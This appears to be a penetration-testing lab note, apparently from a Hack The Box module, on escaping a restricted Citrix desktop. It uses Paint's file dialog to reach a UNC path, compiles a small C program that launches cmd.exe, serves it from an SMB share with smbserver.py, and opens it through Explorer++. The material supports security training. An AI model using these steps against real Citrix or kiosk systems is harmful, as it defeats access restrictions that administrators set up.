# Citrix Breakout

## Bypassing Path Restriction

1. Paint
2. File
    * Open
    * File name: \\\\127.0.0.1\\c$\\Users\\pmorgan\\Downloads

## SMB Share

### Malicious Code

```c title="pwn.c" linenums="1"
#include <stdlib.h>

int main()
{
    system("C:\\Windows\\System32\\cmd.exe");
}
```

### Compilation

```sh
htb-student@ubuntu:~$ gcc -o /tmp/pwn.exe pwn.c
```

### Serving

```sh
htb-student@ubuntu:~$ sudo smbserver.py -smb2support share /tmp
```

### Accessing

1. [Explorer++](https://explorerplusplus.com/)
2. View
3. Toolbars
    * Address Bar
    * Address: \\\\10.13.38.95\\share
